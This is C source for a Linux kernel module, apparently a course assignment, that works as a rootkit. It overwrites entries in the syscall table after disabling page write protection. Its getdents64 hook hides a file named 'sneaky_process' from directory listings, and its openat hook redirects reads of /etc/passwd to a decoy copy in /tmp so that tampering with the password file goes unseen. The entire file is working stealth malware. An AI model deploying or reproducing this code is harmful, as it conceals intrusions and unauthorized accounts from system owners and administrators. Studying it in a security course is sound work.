#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>


#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

#define PREFIX "sneaky_process"



//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

/*----------------------------getdent-----------------------------*/
// 1. hide the “sneaky_process” executable file from both the ‘ls’ and ‘find’
// “ls /home/userid/hw5” should show all files in that directory except for “sneaky_process”.
// “find /home/userid -name sneaky_process” should not return any results
asmlinkage int(*original_getdents64)(struct pt_regs *regs);

asmlinkage int sneaky_getdents64(struct pt_regs* regs){
  int totalDirpLength = (*original_getdents64)(regs);
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  int i = 0;
  while (i < totalDirpLength) {
    struct linux_dirent64 *curr = (void *)dirp + i;
    if (strcmp(curr->d_name, "sneaky_process") == 0) {
      int len = curr->d_reclen;
      i += len;
      totalDirpLength -= len;
      char *prev = (char *)curr;
      char *next = (char *)curr + len;
      int remaining = totalDirpLength - i;
      memmove(prev, next, remaining);
      continue;
    }
    i += curr->d_reclen;
  }
  return totalDirpLength;
}


// Function pointer will be used to save address of the original 'openat' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).

/*----------------------------openat-----------------------------*/
// 3. hide the modifications to the /etc/passwd file that the sneaky_process made
// "cat /etc/passwd" should return contents of the original password file
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
    const char* sneakyPasswdPath = "/tmp/passwd";
    copy_to_user((char*)(regs->si), sneakyPasswdPath, strlen(sneakyPasswdPath));
  }
  return (*original_openat)(regs);
}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");